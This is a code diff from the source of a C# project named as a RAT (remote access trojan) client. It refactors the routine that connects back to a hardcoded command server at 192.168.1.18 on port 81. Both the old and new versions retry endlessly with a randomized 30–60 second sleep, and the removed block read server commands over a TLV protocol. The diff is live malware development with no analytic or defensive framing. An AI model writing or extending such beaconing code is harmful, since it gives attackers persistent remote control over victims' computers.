@@ -3,25 +3,16 @@ using System.Net.Sockets;
 using System.Net;
 using System.Threading;
 using RATclientSparta.Server;
+using RATclientSparta.Socket;
 
 namespace SpartaRATclient
 {
     public class SocketServer
     {
-        private static Socket SetSocket()
+        public static System.Net.Sockets.Socket Connect()
         {
-            return new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
-        }
-
-        private static IPEndPoint SetIpAddress()
-        {
-            return new IPEndPoint(IPAddress.Parse("192.168.1.18"), 81);
-        }
-
-        public static Socket Connect()
-        {
-            Socket ServerSocketObject = SetSocket();
-            IPEndPoint IPEndpoint = SetIpAddress();
+            System.Net.Sockets.Socket ServerSocketObject = RATclientSparta.Socket.Socket.Set(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
+            IPEndPoint IPEndpoint = RATclientSparta.Socket.EndPoint.Set("192.168.1.18", 81);
 
             while (true)
             {
@@ -36,22 +27,6 @@ namespace SpartaRATclient
                     Thread.Sleep(_.Next(30000, 60000));
                 }
             }
-
-            try
-            {
-                ServerSocketObject.Connect(IPEndpoint);
-                ServerData server = new ServerData(ServerSocketObject);
-
-                //reading data from server. when lost connection it will return and then Connect() again
-                //Receive is a function at the "ServerData" class that reads data using TLV Protocol
-                server.Receive();
-            }
-            catch
-            {
-                Random _ = new Random();
-                Thread.Sleep(_.Next(30000, 60000));
-            }
-            Connect();
         }
     }
 }
